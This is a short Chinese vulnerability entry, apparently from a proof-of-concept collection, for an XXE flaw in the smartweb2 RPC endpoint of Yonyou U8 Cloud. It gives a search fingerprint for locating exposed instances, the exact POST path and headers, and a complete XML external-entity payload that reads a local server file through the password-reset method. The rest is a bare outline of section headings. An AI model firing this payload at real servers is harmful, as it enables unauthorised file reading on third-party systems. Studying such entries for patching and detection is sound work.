# 用友U8Cloudsmartweb2存在xxe漏洞

- **系统**：用友　|　**类型**：XXE　|　**CVE**：—
- **指纹**：`app.name="用友 U8 Cloud"`
- **请求**：`POST /hrss/dorado/smartweb2.RPC.d?__rpc=true HTTP/1.1`
- **关键头**：`Content-Type: application/x-www-form-urlencoded`　`Cookie: JSESSIONID=C2CFFE1429FF812ABF357C2BDD5BDBC1.server; JSESSIONID=8FEF31DBA1E318870…`　`Content-Length: 672`

**请求体 / payload**
```
__viewInstanceId=nc.bs.hrss.rm.ResetPassword~nc.bs.hrss.rm.ResetPasswordViewModel&__xml=<!DOCTYPE z [<!ENTITY Password SYSTEM "file:///C://windows//win.ini">]><rpc transaction="10" method="resetPwd"><vps><p
name="__profileKeys">%26Password;</p
></vps></rpc>
```

**其他**
- 用友U8 Cloud smartweb2存在xxe漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 用友U8 Cloud